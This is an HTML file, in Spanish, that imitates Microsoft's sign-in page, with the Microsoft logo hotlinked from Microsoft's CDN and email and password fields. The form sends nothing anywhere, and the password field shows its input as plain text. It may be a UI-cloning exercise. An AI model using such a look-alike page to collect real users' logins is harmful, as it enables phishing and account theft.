<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <div class="principal-container">
        <div class="inner">
            <form>
                <div class="picture mb-20">
                    <img src="https://cdn.odc.officeapps.live.com/odc/stat/images/hrd/microsoft_logo.svg"
                        alt="Logotipo de Microsoft">
                </div>
                <h1 class="lucida-grande title">
                    Iniciar sesión.
                </h1>
                <div class="w-100 mb-20">
                    <input type="text" class="input" name="email" placeholder="Correo electrónico, teléfono o Skype">
                </div>
                <div class="w-100 mb-20">
                    <input type="text" class="input" name="password" placeholder="Contraseña">
                </div>
                <div class="w-100">
                    <p class="crear-cuenta">
                        ¿No tienes ninguna cuenta? <a href="" class="enlace-crear">Crear una.</a>
                    </p>
                </div>
                <div class="w-100 boton-container">
                    <button class="boton" type="submit">
                        Ingresar
                    </button>
                </div>
            </form>
        </div>
    </div>
</body>

</html>
